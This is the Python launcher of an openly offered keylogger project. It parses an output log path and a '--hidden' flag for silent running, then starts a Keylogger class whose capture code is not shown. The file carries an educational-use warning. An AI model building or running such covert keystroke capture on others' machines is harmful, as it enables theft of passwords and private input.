#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SimpleKeylogger - Main module to run the keylogger
Author: Yash (Popeye) Raut
GitHub: https://github.com/yashraut369
"""

import argparse
import os
import sys

# Add current directory to path for imports
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Import the Keylogger class
from keylogger.keylogger import Keylogger

def main():
    """
    Main function to run the keylogger.
    """
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Simple Keylogger for educational purposes.')
    parser.add_argument('--output', '-o', 
                        default='keylog.txt',
                        help='Output file to save keystrokes (default: keylog.txt)')
    parser.add_argument('--hidden', '-H',
                        action='store_true',
                        help='Hide console output (run silently)')
    
    args = parser.parse_args()
    
    # Create output directory if it doesn't exist
    output_dir = os.path.dirname(args.output)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Initialize keylogger
    keylogger = Keylogger(log_file=args.output)
    
    # Display banner unless hidden mode is enabled
    if not args.hidden:
        print("=" * 50)
        print("SimpleKeylogger v0.1.0")
        print("Author: Yash (Popeye) Raut")
        print("GitHub: https://github.com/yashraut369")
        print("=" * 50)
        print("\nWARNING: This tool should only be used for educational purposes")
        print("or on systems you own/have permission to monitor.\n")
    
    try:
        # Start the keylogger
        keylogger.start()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()